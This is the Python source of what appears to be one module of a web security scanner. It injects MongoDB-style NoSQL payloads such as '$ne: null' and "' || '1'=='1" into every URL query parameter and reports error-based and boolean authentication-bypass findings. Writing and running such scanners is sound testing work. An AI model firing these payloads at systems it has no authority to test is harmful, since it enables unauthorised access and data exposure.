"""NoSQL injection scanner (MongoDB-style)."""
import urllib.parse, json
from core.http import get, post
from core.findings import Finding
from core.memory import log_event

PAYLOADS = [
    ("' || '1'=='1", "string"),
    ('{"$gt":""}', "json"),
    ('{"$ne":null}', "json"),
    ("' || 1==1 //", "string"),
    ("admin' || '1'=='1", "string"),
]

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    test_params = list(qs.keys()) if qs else []
    if not test_params:
        return findings
    for param in test_params:
        # error-based
        for payload, kind in PAYLOADS:
            q = dict(qs)
            q[param] = [payload]
            new_url = parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl()
            r = get(new_url)
            if r.status == 0:
                continue
            text = (r.text or "").lower()
            if any(e in text for e in ["mongo", "bson", "cast to objectid", "unexpected token", "json parse error", "unexpected end"]):
                findings.append(Finding(
                    id=f"nosqli-{hash(new_url+payload) & 0xffff:x}",
                    target=parsed.netloc,
                    type="NoSQL Injection",
                    severity="high",
                    url=new_url,
                    parameter=param,
                    payload=payload,
                    evidence="NoSQL error in response",
                    response_snippet=r.snippet(300),
                    confidence=0.75,
                ))
                break
        # boolean-based: $ne
        try:
            q1 = dict(qs); q1[param] = [f"{{\"$ne\": null}}"]
            r1 = get(parsed._replace(query=urllib.parse.urlencode(q1, doseq=True)).geturl())
            q2 = dict(qs); q2[param] = ["nonexistentvalue12345"]
            r2 = get(parsed._replace(query=urllib.parse.urlencode(q2, doseq=True)).geturl())
            if r1.status == 200 and r2.status in (401, 403, 404, 500) and r1.text != r2.text:
                findings.append(Finding(
                    id=f"nosqli-bool-{hash(url+param) & 0xffff:x}",
                    target=parsed.netloc,
                    type="NoSQL Injection (boolean)",
                    severity="high",
                    url=url,
                    parameter=param,
                    payload='{"$ne": null}',
                    evidence=f"Auth bypass via $ne (status {r1.status} vs {r2.status})",
                    response_snippet=r1.snippet(200),
                    confidence=0.6,
                ))
        except Exception:
            pass
    log_event(parsed.netloc, "nosqli_scan", {"url": url, "findings": len(findings)})
    return findings
